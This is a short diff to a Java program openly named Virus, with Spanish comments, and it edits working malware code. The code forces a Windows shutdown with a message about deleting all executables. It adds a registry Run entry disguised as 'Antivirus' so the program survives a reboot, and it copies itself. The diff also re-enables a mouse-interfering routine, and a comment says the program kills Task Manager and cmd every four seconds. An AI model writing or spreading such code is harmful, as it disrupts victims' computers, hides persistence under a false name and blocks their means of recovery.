@@ -57,7 +57,7 @@ public class Virus extends Frame {
     public void enSistema() {
         try {
             //Runtime.getRuntime().exec("msg *ESTAS INFECTADO POR EL VIRUS");
-            Runtime.getRuntime().exec("shutdown -s -t 6 -c Virus::Borrando--Todos--Los--Exe...");
+            Runtime.getRuntime().exec("shutdown -s -t 600 -c Virus::Borrando--Todos--Los--Exe...");
             Runtime.getRuntime().exec("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Antivirus /d C:\\VirusSeguridad.jar");
         } catch (IOException ex) {
             Logger.getLogger(Virus.class.getName()).log(Level.SEVERE, null, ex);
@@ -101,7 +101,7 @@ public class Virus extends Frame {
         Virus virus = new Virus();
         virus.autoCopia();
         virus.enSistema();
-        //virus.mouseCold();
+        virus.mouseCold();
         virus.show();
         //Cierra el taskmgr.exe y el cmd.exe cada 4 segundos
         while (SinTask == false) {
